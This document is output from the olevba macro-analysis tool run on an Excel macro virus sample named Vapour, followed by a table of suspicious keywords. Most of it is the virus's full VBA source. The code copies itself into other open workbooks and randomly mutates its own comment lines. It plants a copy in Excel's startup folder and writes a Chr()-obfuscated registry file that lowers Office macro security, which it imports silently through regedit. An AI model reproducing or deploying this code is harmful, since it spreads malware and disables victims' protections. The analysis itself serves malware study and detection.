olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Vapour-ba58771f4938e7baf95abd2a69ecac51b6afb7fe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Vapour-ba58771f4938e7baf95abd2a69ecac51b6afb7fe - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Workbook_Deactivate()
On Error Resume Next
Set a = ActiveWorkbook
Set c = a.VBProject.VBComponents("ThisWorkbook")
Set B = c.CodeModule
Set L = B.Lines
Set t = ThisWorkbook
Set i = t.VBProject.VBComponents("ThisWorkbook")
Set z = i.CodeModule
If L(2, 1) <> "On Error Resume Next" Then
B.deletelines 1, B.countoflines
'
B.Insertlines 1, z.Lines(1, z.countoflines)
'
'
'
'
'
'
End If
For n = 9 To z.countoflines: Randomize
'
'
ma = Int((Rnd * 4) + 1)
If z.Lines(n, 1) = "'" And ma >= 2 Then
'
z.deletelines n, 1
End If: Next n
'
'
'
For i = 9 To z.countoflines: Randomize
ma = Int((Rnd * 4) + 1)
If ma <= 2 Then
'
'
z.f i, "'"
'
End If
: Next i
'
'
If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
ActiveWorkbook.SaveAs Excel.Application.StartupPath & "\Book1."
Open "c:\Windows\Office.reg" For Output As 1
Print #1, Chr(82) + Chr(69) + Chr(71) + Chr(69) + Chr(68) + Chr(73) + Chr(84) + Chr(52)
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(56) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(93)
Print #1, Chr(34) + Chr(79) + Chr(112) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(115) + Chr(54) + Chr(34) + Chr(61) + Chr(100) + Chr(119) + Chr(111) + Chr(114) + Chr(100) + Chr(58) + Chr(48) + Chr(48) + Chr(48) + Chr(48) + Chr(48) + Chr(48) + Chr(48) + Chr(48)
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(57) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
Print #1, Chr(34) + Chr(76) + Chr(101) + Chr(118) + Chr(101) + Chr(108) + Chr(34) + Chr(61) + Chr(100) + Chr(119) + Chr(111) + Chr(114) + Chr(100) + Chr(58) + Chr(48) + Chr(48) + Chr(48) + Chr(48) + Chr(48) + Chr(48) + Chr(48) + Chr(49)
Close 1
Shell "regedit /s c:\Windows\Office.reg", vbHide
End If
If (Day(Now)) = (Minute(Now)) Then
MsgBox Chr(89) + Chr(111) + Chr(117) + Chr(96) + Chr(108) + Chr(108) + Chr(32) + Chr(70) + Chr(111) + Chr(114) + Chr(101) + Chr(118) + Chr(101) + Chr(114) + Chr(32) + Chr(98) + Chr(101) + Chr(32) + Chr(97) + Chr(32) + Chr(118) + Chr(97) + Chr(112) + Chr(111) + Chr(117) + Chr(114) + Chr(32) + Chr(116) + Chr(114) + Chr(105) + Chr(97) + Chr(108) + Chr(32) + Chr(105) + Chr(110) + Chr(32) + Chr(109) + Chr(121) + Chr(32) + Chr(115) + Chr(107) + Chr(105) + Chr(101) + Chr(115), vbInformation, Chr(86) + Chr(97) + Chr(80) + Chr(111) + Chr(85) + Chr(114) + Chr(32) + Chr(84) + Chr(114) + Chr(65) + Chr(105) + Chr(76)
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Vapour-ba58771f4938e7baf95abd2a69ecac51b6afb7fe - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Vapour-ba58771f4938e7baf95abd2a69ecac51b6afb7fe - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Vapour-ba58771f4938e7baf95abd2a69ecac51b6afb7fe - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Office.reg          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

